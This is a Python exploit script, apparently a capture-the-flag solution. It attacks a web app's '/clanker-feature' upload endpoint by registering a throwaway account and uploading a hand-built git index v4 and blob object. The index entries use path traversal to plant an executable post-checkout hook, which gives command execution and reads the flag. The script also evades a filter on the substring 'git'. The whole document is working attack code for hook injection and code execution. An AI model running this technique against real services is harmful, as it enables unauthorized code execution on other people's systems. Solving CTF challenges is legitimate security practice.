#!/usr/bin/env python3
import hashlib
import io
import os
import random
import re
import struct
import sys
import time
import zlib

import requests


def encode_varint(value: int) -> bytes:
    if value == 0:
        return b"\x00"
    out = []
    while value > 0:
        b = value & 0x7F
        value >>= 7
        if value > 0:
            b |= 0x80
        out.append(b)
    return bytes(out)


def compress_v4_path(path: bytes, previous: bytes) -> bytes:
    common = 0
    for a, b in zip(path, previous):
        if a != b:
            break
        common += 1
    remove_len = len(previous) - common
    suffix = path[common:]
    return encode_varint(remove_len) + suffix + b"\x00"


def build_blob(script: bytes):
    store = f"blob {len(script)}\0".encode() + script
    sha_hex = hashlib.sha1(store).hexdigest()
    return sha_hex, zlib.compress(store)


def build_index_v4(blob_sha_hex: str, blob_size: int) -> bytes:
    sha_raw = bytes.fromhex(blob_sha_hex)
    entries = [
        b"../dump/.g",
        b"../dump/.git/hooks/post-checkout",
    ]
    now = int(time.time())
    buf = io.BytesIO()
    buf.write(b"DIRC")
    buf.write(struct.pack(">LL", 4, len(entries)))

    previous = b""
    for path in entries:
        # ctime sec/nsec, mtime sec/nsec, dev, ino, mode, uid, gid, size
        buf.write(struct.pack(">LLLLLLLLLL", now, 0, now, 0, 0, 0, 0o100755, 0, 0, blob_size))
        buf.write(sha_raw)
        flags = len(path) & 0x0FFF
        buf.write(struct.pack(">H", flags))
        buf.write(compress_v4_path(path, previous))
        previous = path

    content = buf.getvalue()
    return content + hashlib.sha1(content).digest()


def make_payloads():
    # Hook writes the real flag into /tmp/dump/flag.txt, which the app later reads.
    script = b"#!/bin/sh\n/usr/local/bin/read-flag > flag.txt\n"
    obj_sha, obj_data = build_blob(script)
    idx_data = build_index_v4(obj_sha, len(script))

    assert b"git" not in idx_data, "index still contains forbidden substring 'git'"
    assert b"git" not in obj_data, "object still contains forbidden substring 'git'"

    obj_name = f".git/objects/{obj_sha[:2]}/{obj_sha[2:]}"
    return idx_data, obj_name, obj_data


def register_or_login(sess: requests.Session, base: str, username: str, password: str):
    r = sess.post(base + "/register", data={"username": username, "password": password}, timeout=10)
    if r.status_code not in (200, 302):
        raise RuntimeError(f"register failed: {r.status_code}")
    # If username exists, try login.
    if "/listing" not in r.url and "Username already exists" in r.text:
        r = sess.post(base + "/login", data={"username": username, "password": password}, timeout=10)
        if "/listing" not in r.url and r.status_code != 302:
            raise RuntimeError("login failed")


def exploit(base: str):
    base = base.rstrip("/")
    sess = requests.Session()
    user = f"pwn{random.randrange(10**8, 10**9)}"
    pw = "pw12345678"
    register_or_login(sess, base, user, pw)

    idx_data, obj_name, obj_data = make_payloads()

    files = [
        ("file", (".git/index", idx_data, "application/octet-stream")),
        ("file", (obj_name, obj_data, "application/octet-stream")),
    ]
    r = sess.post(base + "/clanker-feature", files=files, timeout=20)
    print(f"status={r.status_code}")

    m = re.search(r"bctf\{[^}]+\}", r.text)
    if m:
        print("FLAG:", m.group(0))
    else:
        print(r.text)


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"usage: {sys.argv[0]} http://host:port")
        sys.exit(1)
    exploit(sys.argv[1])
